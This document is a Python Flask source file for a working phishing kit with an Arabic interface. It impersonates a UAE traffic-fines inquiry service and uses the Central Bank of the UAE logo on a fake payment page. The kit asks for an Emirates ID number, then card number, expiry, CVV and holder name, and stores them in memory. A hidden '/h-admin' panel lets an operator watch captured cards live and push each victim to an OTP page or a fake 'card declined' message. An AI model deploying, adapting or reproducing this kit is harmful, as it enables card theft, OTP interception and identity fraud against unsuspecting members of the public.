import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# مخزن البيانات المؤقت
db = {"logs": [], "status": "waiting"}

# --- الهيدر الحكومي الثابت ---
HEADER_HTML = """
<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;">
</div>
"""

# --- 1. الصفحة الرئيسية (الـ 8 صور كاملة) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html {{ margin:0; padding:0; background:#f4f4f4; }}
    .page {{ max-width:650px; margin:0 auto; position:relative; background:white; }}
    img {{ width:100%; display:block; }}
    .btn-hidden {{ position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }}
</style>
</head>
<body>
    {HEADER_HTML}
    <div class="page">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <button class="btn-hidden" style="top:270px;" onclick="location.href='/search'"></button>
        <button class="btn-hidden" style="top:325px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (النسخة الجامبو العريضة) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#f4f4f4; margin:0; font-family:sans-serif; }}
    .card {{ background:white; width:92%; max-width:850px; margin:30px auto; border-radius:15px; border-top:10px solid #b0914f; box-shadow:0 10px 40px rgba(0,0,0,0.1); padding:40px; box-sizing:border-box; }}
    label {{ display:block; font-weight:bold; margin-bottom:10px; font-size:18px; }}
    select, input {{ width:100%; padding:18px; margin-bottom:25px; border:1px solid #ccc; border-radius:8px; font-size:17px; }}
    .grid {{ display:grid; grid-template-columns: 1fr 1fr 2fr; gap:10px; }}
    .btn-go {{ background:#b0914f; color:white; width:100%; padding:20px; border:none; border-radius:10px; font-size:22px; font-weight:bold; cursor:pointer; }}
</style></head>
<body>
    {HEADER_HTML}
    <div class="card">
        <h2 style="text-align:center; color:#333;">الاستعلام عن المخالفات الموحد</h2>
        <form action="/checkout" method="GET">
            <label>إمارة مصدر اللوحة:</label>
            <select><option>أبوظبي</option><option>دبي</option><option>الشارقة</option><option>عجمان</option></select>
            <label>فئة ورقم اللوحة:</label>
            <div class="grid">
                <select><option>خصوصي</option><option>نقل</option></select>
                <input type="text" placeholder="الرمز">
                <input type="text" placeholder="رقم اللوحة">
            </div>
            <label>رقم الهوية الإماراتية:</label>
            <input type="text" placeholder="784-XXXX-XXXXXXX-X" required>
            <button type="submit" class="btn-go">بحث وتفصيل المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. بوابة الدفع (النسخة الاحترافية 2026) ---
PAY_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#f2f4f7; font-family:Arial, sans-serif; margin:0; }}
    .pay-container {{ max-width:500px; margin:50px auto; background:white; border-radius:10px; box-shadow:0 5px 25px rgba(0,0,0,0.1); padding:35px; border:1px solid #ddd; }}
    .bank-logo {{ text-align:center; margin-bottom:30px; }}
    .bank-logo img {{ height:60px; }}
    input {{ width:100%; padding:15px; margin-bottom:20px; border:1px solid #bbb; border-radius:5px; font-size:16px; box-sizing:border-box; }}
    .btn-pay {{ background:#2c3e50; color:white; width:100%; padding:18px; border:none; border-radius:5px; font-size:18px; font-weight:bold; cursor:pointer; }}
</style></head>
<body>
    {HEADER_HTML}
    <div class="pay-container">
        <div class="bank-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png"></div>
        <div style="background:#fff9e6; padding:15px; border-radius:5px; text-align:center; margin-bottom:20px; border:1px solid #ffeeba; color:#856404;">المبلغ الإجمالي: 255.00 درهم</div>
        <form action="/submit-card" method="POST">
            <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
            <input type="text" id="card_num" name="card" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required>
            <div style="display:flex; gap:10px;"><input type="text" name="exp" placeholder="MM/YY"><input type="text" name="cvv" placeholder="CVV"></div>
            <button type="submit" class="btn-pay">دفع آمن عبر المصرف المركزي</button>
        </form>
    </div>
</body>
</html>
"""

# --- 4. لوحة التحكم الحية (/h-admin) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#121212; color:white; font-family:sans-serif; padding:30px; }
    .log-box { background:#1e1e1e; border:1px solid gold; padding:20px; margin-bottom:15px; border-radius:8px; }
    .btn { padding:12px 25px; border:none; border-radius:5px; cursor:pointer; font-weight:bold; margin-right:10px; }
    .btn-go { background:#2ecc71; color:white; } .btn-no { background:#e74c3c; color:white; }
</style></head>
<body>
    <h1>لوحة تحكم حسن 👮‍♂️</h1>
    <div id="logs"></div>
    <script>
        function load() {
            fetch('/get-logs').then(r => r.json()).then(data => {
                let h = '';
                data.logs.forEach(l => {
                    h += `<div class="log-box"><p>${JSON.stringify(l)}</p>
                    <button class="btn btn-go" onclick="act('go_otp')">طلب OTP</button>
                    <button class="btn btn-no" onclick="act('error_card')">رفض البطاقة</button></div>`;
                });
                document.getElementById('logs').innerHTML = h;
            });
        }
        function act(s) { fetch('/set-status/' + s); }
        setInterval(load, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/h-admin')
def admin_p(): return render_template_string(ADMIN_HTML)

@app.route('/submit-card', methods=['POST'])
def sub():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status']})

WAIT_JS = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp';
            if(d.status === 'error_card') { alert('البطاقة مرفوضة'); location.href='/checkout'; }
        });
    }, 3000);
</script>
<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
    <div style="border:8px solid #f3f3f3; border-top:8px solid #b0914f; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري مراجعة البنك...</h2>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
"""

@app.route('/otp')
def otp(): return "<body><div style='text-align:center; padding:50px;'><h2>أدخل رمز OTP</h2><form action='/submit-card' method='POST'><input name='otp' style='padding:15px; font-size:20px;'><button>تأكيد</button></form></div></body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
